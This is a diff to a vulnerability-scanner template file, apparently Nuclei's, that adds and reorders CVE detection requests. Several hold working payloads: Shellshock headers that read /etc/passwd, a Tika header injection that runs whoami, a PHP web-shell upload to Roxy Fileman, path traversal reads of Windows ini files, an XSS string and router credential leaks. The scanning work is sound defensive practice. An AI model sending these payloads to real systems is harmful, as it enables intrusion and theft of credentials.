@@ -3354,9 +3354,9 @@
       "requests": [
         {
           "headers": {
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -6462,11 +6462,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
-            "Connection": "close",
             "X-Tika-OCRTesseractPath": "cscript",
             "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
-            "Content-type": "image/jp2"
+            "Content-type": "image/jp2",
+            "Connection": "close"
           },
           "method": "PUT",
           "path": [
@@ -7459,6 +7459,21 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/_s_/dyn/Log_highlight?href=../../../../windows/win.ini&n=1#selected"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2018-20526",
+      "info": {
+        "name": "Roxy Fileman 1.4.5 - Unrestricted File Upload",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /php/upload.php HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary20kgW2hEKYaeF5iP\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36\nOrigin: {{BaseURL}}\nReferer: {{BaseURL}}\nAccept-Encoding: gzip, deflate\nAccept-Language: en-GB,en-US;q=0.9,en;q=0.8\n\n------WebKitFormBoundary20kgW2hEKYaeF5iP\nContent-Disposition: form-data; name=\"action\"\n\nupload\n------WebKitFormBoundary20kgW2hEKYaeF5iP\nContent-Disposition: form-data; name=\"method\"\n\najax\n------WebKitFormBoundary20kgW2hEKYaeF5iP\nContent-Disposition: form-data; name=\"d\"\n\n/Uploads\n------WebKitFormBoundary20kgW2hEKYaeF5iP\nContent-Disposition: form-data; name=\"files[]\"; filename=\"{{randstr}}.php7\"\nContent-Type: application/octet-stream\n\n<?php\necho exec($_GET[\"cmd\"]);\n?>\n\n------WebKitFormBoundary20kgW2hEKYaeF5iP--\n",
+            "GET /Uploads/{{randstr}}.php7?cmd=echo+\"roxyfileman\"+|+rev HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
@@ -9389,6 +9404,21 @@
       ]
     },
     {
+      "id": "CVE-2019-20933",
+      "info": {
+        "name": "Authentication Bypass InfluxDB",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/query?db=db&q=SHOW%20DATABASES"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2019-2578",
       "info": {
         "name": "Oracle Fusion Middleware WebCenter Sites 12.2.1.3.0  - Broken Access Control",
@@ -10198,6 +10228,20 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/auth/realms/master/protocol/openid-connect/auth?scope=openid&response_type=code&redirect_uri=valid&state=cfx&nonce=cfx&client_id=security-admin-console&request_uri=http://{{interactsh-url}}/"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-10973",
+      "info": {
+        "name": "Wavlink WN530HG4 - Access Control",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "raw": [
+            "GET /backupsettings.dat HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
@@ -11763,9 +11807,9 @@
         {
           "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n",
           "headers": {
-            "content-type": "text/xml",
             "Cookie": "Login",
-            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile"
+            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile",
+            "content-type": "text/xml"
           },
           "method": "POST",
           "path": [
@@ -18587,6 +18631,22 @@
       ]
     },
     {
+      "id": "CVE-2022-0928",
+      "info": {
+        "name": "Microweber - Cross-site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /api/user_login HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nusername={{username}}&password={{password}}\n",
+            "POST /api/shop/save_tax_item HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nReferer: {{BaseURL}}/admin/view:settings\n\nid=0&name=vat1&type=\"><img+src%3dx+onerror%3dalert(document.domain)>&rate=10\n",
+            "POST /module HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nReferer:{{BaseURL}}/admin/view:settings\n\nclass=+module+module-shop-taxes-admin-list-taxes+&id=mw_admin_shop_taxes_items_list&parent-module-id=settings-admin-mw-main-module-backend-shop-taxes-admin&parent-module=shop%2Ftaxes%2Fadmin&data-type=shop%2Ftaxes%2Fadmin_list_taxes"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-0952",
       "info": {
         "name": "Sitemap by click5 < 1.0.36 - Unauthenticated Arbitrary Options Update",
@@ -20319,6 +20379,20 @@
         {
           "raw": [
             "GET /cgi/get_param.cgi?xml&sys.passwd&sys.su.name HTTP/1.1\nHost: {{Hostname}}\nCookie: tmpToken=;\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-34045",
+      "info": {
+        "name": "Wavlink WN530HG4 - Access Control",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "GET /backupsettings.dat HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
